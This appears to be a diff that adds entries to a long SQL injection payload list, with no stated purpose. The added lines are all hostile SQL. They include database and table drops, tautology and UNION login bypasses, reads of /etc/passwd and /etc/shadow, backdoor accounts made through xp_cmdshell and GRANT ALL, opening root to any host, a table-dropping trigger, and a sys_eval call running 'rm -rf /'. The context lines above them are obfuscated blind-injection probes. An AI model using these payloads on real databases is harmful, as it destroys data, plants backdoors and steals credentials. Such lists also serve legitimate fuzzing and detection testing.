@@ -28498,3 +28498,30 @@ AND 300 > ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1),1,1)) /
 SELECT RAWTOHEX('malicious_payload') FROM dual ;
 SELECT * FROM dual WHERE dummy = '' OR 1=1 AND CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(110)||CHR(97)||CHR(109)||CHR(101) IS NOT NULL -- GO
 SELECT * FROM dual WHERE dummy = '' CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(70)||CHR(82)||CHR(79)||CHR(77)||CHR(32)||CHR(97)||CHR(108)||CHR(108)||CHR(95)||CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) -- \G
+DROP DATABASE production;
+DROP TABLE users;
+DELETE FROM employees WHERE 1=1;
+UPDATE accounts SET balance = 0;
+INSERT INTO users (username, password) VALUES ('admin', '1234');
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+SELECT load_file('/etc/passwd');
+SELECT 1; --'
+UNION SELECT null, username, password FROM users;
+INSERT INTO orders VALUES (...); -- malicious override
+EXEC xp_cmdshell 'net user backdoor Pass123 /add';
+GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';
+REVOKE ALL PRIVILEGES FROM admin;
+DROP VIEW confidential_view;
+ALTER USER admin WITH PASSWORD 'weakpass';
+UPDATE config SET value='evil' WHERE key='theme';
+SELECT pg_read_file('/etc/shadow');
+PRAGMA writable_schema=1;
+UPDATE sqlite_master SET sql='DROP TABLE users;' WHERE type='table' AND name='users';
+ATTACH DATABASE 'malicious.db' AS malware;
+CREATE TRIGGER dropper AFTER INSERT ON users BEGIN DROP TABLE logins; END;
+CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
+SELECT sys_eval('rm -rf /');
+INSERT INTO logins VALUES ('attacker','1234'); -- persist backdoor
+UPDATE mysql.user SET Host='%' WHERE User='root';
+FLUSH PRIVILEGES;
+LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE logins;
